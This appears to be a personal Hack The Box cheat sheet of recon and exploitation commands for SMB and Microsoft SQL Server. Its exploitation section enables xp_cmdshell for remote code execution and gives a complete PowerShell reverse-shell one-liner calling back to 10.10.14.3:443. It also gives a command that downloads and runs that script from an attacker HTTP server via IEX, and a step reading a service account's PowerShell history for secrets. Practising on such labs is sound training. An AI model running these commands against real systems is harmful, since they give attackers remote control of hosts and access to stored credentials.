# HTB_cheatsheet

## Recon

### nmap

Scan for open ports: `nmap <IP> -p- -T4` <br />
Scan for services and their versions: `nmap <IP> -p<PORT>,<PORT2>,<...> -T4 -A` <br />
  

### SMB

try to list available shares on smb: `smbclient -L -N \\\\<IP>\\` <br />
connect to smb-share: `smbclient \\\\<IP>\\<SHARE>` <br />
download file from share: `get \<FILE>` <br />

try to find out version of smb-service: use metasploit module ...smb_version TODO <br />

### SQL (Windows)

try to connect via impacket's `mssqlclient.py <USER>@<IP> -windows-auth`<br />
check for admin priviledges to be able to have remote code execution ``SELECT IS_SRVROLEMEMBER (`sysadmin`) `` <br />



## Exploitation

### SMB

Try to get a reverse shell for a given user and password via psexec (impacket):
`psexec.py '\<USER>:\<PW>@\<IP>'` <br />

Check for vulnerability in combination with ftp of ms17_010


### SQL (Windows)

if we have sysadmin privileges we can enable the xp_cmdshell to gain remote code execution on the host
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure
xp_cmdshell "whoami"
```
we then can download a malicious script from our HTTPServer. We can use a One-Liner reverse shell code and save it as a .ps1 file, e.g. with One-Liner content: `$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
from the sql server both download and run it directly via `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` <br />
set up the listener beforehand as usual.


### Privilege Escalation

## Windows

check the PowerShell history file: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`





